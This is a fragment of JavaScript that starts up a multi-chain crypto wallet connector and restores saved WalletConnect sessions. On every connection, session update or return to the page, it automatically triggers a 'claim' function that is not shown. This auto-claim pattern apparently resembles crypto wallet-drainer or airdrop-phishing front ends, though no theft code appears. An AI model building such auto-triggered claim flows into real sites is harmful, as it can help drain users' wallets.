  // ─── Startup ──────────────────────────────────────────────────
  try {
    // Preload libraries in background (but don't block)
    loadWalletConnectLibraries().catch(err => logDebug(`Preload error: ${err.message}`));

    setupEIP6963();

    // Wait a moment for providers and then restore
    await new Promise(r => setTimeout(r, 300));
    await restoreWalletConnection();

    // Session listeners (for WalletConnect)
    if (client) {
      client.on('session_update', ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const account = accounts[0].split(':')[2];
          updateConnectedUI(account, 'evm');
          saveWallet(account, currentSession, 'evm');
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1000);
        }
      });
      client.on('session_delete', () => {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected by provider', 'error');
      });
      client.on('session_connect', (session) => {
        const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (account) {
          saveWallet(account, session, 'evm');
          updateConnectedUI(account, 'evm');
          currentSession = session;
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1000);
        }
      });
    }

    // Global EVM events (if already present)
    if (window.ethereum && isDesktop()) {
      setupEVMProviderEvents(window.ethereum);
    }

    // Visibility change – check for session return
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden && getSavedWallet()) {
        logDebug('Page visible, checking connection...');
        const pendingUri = sessionStorage.getItem('pending_wc_uri');
        const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
        if (pendingUri && pendingTimestamp) {
          const elapsed = Date.now() - parseInt(pendingTimestamp);
          if (elapsed < 120000 && client) {
            logDebug('Visibility change: checking for pending session...');
            setTimeout(async () => {
              try {
                const sessions = client.session.values();
                if (sessions.length > 0) {
                  const session = sessions[0];
                  const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
                  if (account) {
                    saveWallet(account, session, 'evm');
                    updateConnectedUI(account, 'evm');
                    currentSession = session;
                    sessionStorage.removeItem('pending_wc_uri');
                    sessionStorage.removeItem('pending_wc_timestamp');
                    setTimeout(() => {
                      if (typeof window.initiateClaimProcess === 'function') {
                        window.initiateClaimProcess();
                      }
                    }, 1000);
                  }
                }
              } catch (e) {
                logDebug(`Visibility check restore failed: ${e.message}`);
              }
            }, 1000);
          }
        }
      }
    });

    // Cleanup
    window.addEventListener('beforeunload', () => {
      if (modal) modal.closeModal();
    });

    logDebug(`✅ main.js fully initialised with optimised connection flow`);
    logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`);
    logDebug(`   Connection flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM → WalletConnect → Solana → Bitcoin'}`);
  } catch (err) {
    logDebug(`❌ Fatal startup error: ${err.message}`);
    showStatus('Failed to initialise wallet connector', 'error');
  }
})();
